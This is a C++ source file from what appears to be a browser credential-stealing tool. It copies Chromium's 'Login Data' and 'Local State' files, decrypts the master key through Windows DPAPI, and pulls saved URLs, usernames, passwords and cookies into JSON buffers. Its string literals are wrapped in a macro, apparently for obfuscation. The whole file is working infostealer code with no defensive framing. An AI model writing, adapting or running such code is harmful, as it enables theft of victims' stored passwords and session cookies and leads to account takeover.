#include "ChromiumDecrypt.h"

sqlite3* Tool::Browsers::ChromiumDecrypt::OpenDatabase(std::string sDbFilePath)
{
	sqlite3* db;
	int rc = sqlite3_open(sDbFilePath.c_str(), &db);
	if (rc) {
		Tool::Utils::print_error(std::format(STR("Error opening sql database {}"), sDbFilePath));
		return NULL;
	}
	return db;
}

std::string Tool::Browsers::ChromiumDecrypt::UncryptMasterKey(std::string pbDataInput, std::string& sDecodedMasterKey)
{
	DATA_BLOB DataIn;
	DATA_BLOB DataVerify;
	DataIn.pbData = (BYTE*)pbDataInput.c_str();
	DataIn.cbData = (DWORD)pbDataInput.length();

	if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataVerify))
		Tool::Utils::hexStr(DataVerify.pbData, DataVerify.cbData, sDecodedMasterKey);
	return "";
}

int Tool::Browsers::ChromiumDecrypt::PasswordsCallback(void* data, int argc, char** argv, char** azColName)
{
	Tool::Browsers::Browser * BrowserObject = dynamic_cast<Tool::Browsers::Browser*>((Tool::Browsers::Browser * )data);
	Tool::Browsers::ChromiumDecrypt::ExtractPasswordsFromDB(argc, argv, azColName, *BrowserObject);
	return 0;
}

int Tool::Browsers::ChromiumDecrypt::CookiesCallback(void* data, int argc, char** argv, char** azColName)
{
	Tool::Browsers::Browser* BrowserObject = dynamic_cast<Tool::Browsers::Browser*>((Tool::Browsers::Browser*)data);
	Tool::Browsers::ChromiumDecrypt::ExtractCookiesFromDb(argc, argv, azColName, *BrowserObject);
	return 0;
}

bool Tool::Browsers::ChromiumDecrypt::ExecuteSqlCommand(sqlite3* db, std::string query, Tool::Browsers::Browser& BrowserType, bool bForPasswords)
{
	char* zErrMsg = 0;
	int rc;
	if (bForPasswords)
		rc = sqlite3_exec(db, query.c_str(), Tool::Browsers::ChromiumDecrypt::PasswordsCallback, &BrowserType, &zErrMsg);
	else
		rc = sqlite3_exec(db, query.c_str(), Tool::Browsers::ChromiumDecrypt::CookiesCallback, &BrowserType, &zErrMsg);
	if (rc != SQLITE_OK) {
		sqlite3_free(zErrMsg);
		return false;
	}
	return true;
}

int Tool::Browsers::ChromiumDecrypt::ExtractPasswordsFromDB(int argc, char** argv, char** azColName, Tool::Browsers::Browser& BrowserType)
{
	std::string finalUser;
	std::string tempUser;
	BrowserType.iPasswordId += 1;
	std::string encryptedPass;
	Tool::Utils::hexStr((BYTE*)argv[2], (int)strlen(argv[2]), encryptedPass);
	std::string username = std::string(argv[1]);
	for (int i = 0; i < username.length(); i++)
	{
		if (username[i] == '\\')
		{
			std::string part = std::string(username).substr(0, i + 1);
			tempUser = part + R"(\\\)" + std::string(username).substr(i + 1);
		}
	}
	if (!tempUser.empty())
		finalUser = tempUser;
	else
		finalUser = std::string(username);
	std::string tempString = "\"" + std::to_string(BrowserType.iPasswordId) + "\": "
		+ STR("{\"url\": \"") + std::string(argv[0])
		+ STR("\",\"username\": \"") + finalUser
		+ STR("\",\"password\": \"") + encryptedPass + "\"},";
	BrowserType.sPasswordsBuffer = BrowserType.sPasswordsBuffer + tempString;
	return 0;
}

void Tool::Browsers::ChromiumDecrypt::CopyLoginDB(std::string &sNewLoginDbPath, Tool::Browsers::Browser& BrowserType){
	std::string sDbFilePath = std::format(STR("{}\\Default\\Login Data"), BrowserType.sBrowserRootPath);
	BrowserType.CopyBrowserFileToProducts(sDbFilePath, sNewLoginDbPath);
}

bool Tool::Browsers::ChromiumDecrypt::RetrievePasswords(Tool::Browsers::Browser* const & BrowserType) {
	//Copy Login DB for passwords
	std::string query = STR("SELECT action_url,username_value,password_value FROM logins");
	std::string sNewLoginDbPath;
	Tool::Browsers::ChromiumDecrypt::CopyLoginDB(sNewLoginDbPath, *BrowserType);
	if (!sNewLoginDbPath.empty())
	{
		sqlite3* db = Tool::Browsers::ChromiumDecrypt::OpenDatabase(sNewLoginDbPath);
		if (db == NULL) return false;
		if (!Tool::Browsers::ChromiumDecrypt::ExecuteSqlCommand(db, &query[0], *BrowserType))
			Tool::Utils::print_error(std::format(STR("Failed executing sql command {}")));
		sqlite3_close(db);
		return true;
	}
	return false;
}

bool Tool::Browsers::ChromiumDecrypt::RetrieveMasterKey(std::string& sDecodedMasterKey, Tool::Browsers::Browser * const &BrowserType) {
	// Copy Local State DB file for master key
	std::string sTargetDbFilePath;
	awesomejson::json jLoginData;
	std::string sDbFilePath = std::format(STR("{}\\Local State"), BrowserType->sBrowserRootPath);
	BrowserType->CopyBrowserFileToProducts(sDbFilePath, sTargetDbFilePath);
	std::ifstream f(sTargetDbFilePath);
	f >> jLoginData;
	std::string key1(STR("os_crypt"));
	std::string key2(STR("encrypted_key"));
	std::string sEncodedMasterKey = jLoginData[key1][key2];
	std::string sDecodedData = Tool::Utils::Base64decode(sEncodedMasterKey);
	sDecodedData = sDecodedData.substr(5);
	Tool::Browsers::ChromiumDecrypt::UncryptMasterKey(sDecodedData, sDecodedMasterKey);
	if (sDecodedMasterKey.empty()) {
		Tool::Utils::print_error(STR("Unable to retrieve master key for Chrome"));
		return false;
	}
	return true;
}

int Tool::Browsers::ChromiumDecrypt::ExtractCookiesFromDb(int argc, char** argv, char** azColName, Tool::Browsers::Browser& BrowserType)
{
	std::string encryptedCookie;
	Tool::Utils::hexStr((BYTE*)argv[1], (int)strlen(argv[1]), encryptedCookie);
	BrowserType.sCookiesBuffer += STR("{\"Domain\": \"") + std::string(argv[0]) + STR("\", \"Value\": \"") + encryptedCookie + "\"},";
	return 0;
}
